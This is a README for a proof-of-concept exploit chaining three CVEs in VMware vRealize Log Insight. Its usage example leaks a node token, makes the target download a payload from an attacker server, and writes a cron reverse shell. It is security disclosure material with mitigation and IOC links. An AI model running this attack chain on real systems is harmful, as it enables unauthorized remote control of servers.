# VMSA-2023-0001
POC for VMSA-2023-0001 affecting VMware vRealize Log Insight which includes the following CVEsl:
* VMware vRealize Log Insight Directory Traversal Vulnerability (CVE-2022-31706)
* VMware vRealize Log Insight broken access control Vulnerability (CVE-2022-31704)
* VMware vRealize Log Insight contains an Information Disclosure Vulnerability (CVE-2022-31711)

The default configuration of this vulnerability writes a cron job to create a
reverse shell. Be sure to change the `payload` file to suite your environment.

## Technical Analysis
A technical root cause analysis of the vulnerability can be found on our blog:
https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive

## Indicators of Compromise
For analyzing Log Insight instances for indicators of compromise check out our IOC blog:
https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/

## Summary
This POC abuses the various Thrift RPC endpoints to achieve an arbitrary file write.

## Usage
```plaintext
$ python3 VMSA-2023-0001.py --target_address 192.168.4.133 --http_server_address 192.168.4.60 --http_server_port 8080 --payload_file payload --payload_path /etc/cron.d/exploit 
[+] Using CVE-2022-31711 to leak node token
[+] Found node token: f261d2f5-71fa-45fd-a0a0-6114a55a8fb8
[+] Using CVE-2022-31704 to trigger malicious file download
192.168.4.133 - - [30/Jan/2023 16:43:41] "GET /exploit.tar HTTP/1.1" 200 -
[+] File successfully downloaded
[+] Using CVE-2022-31706 to trigger directory traversal and write cron reverse shell
[+] Payload successfully delivered
```

## Troubleshooting
If using a cron based payload, make sure the payload file has the appropriate
permissions and owner:
```shell
sudo chown root:root payload
```
```shell
sudo chmod 0644 payload 
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the VMSA
https://www.vmware.com/security/advisories/VMSA-2023-0001.html

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

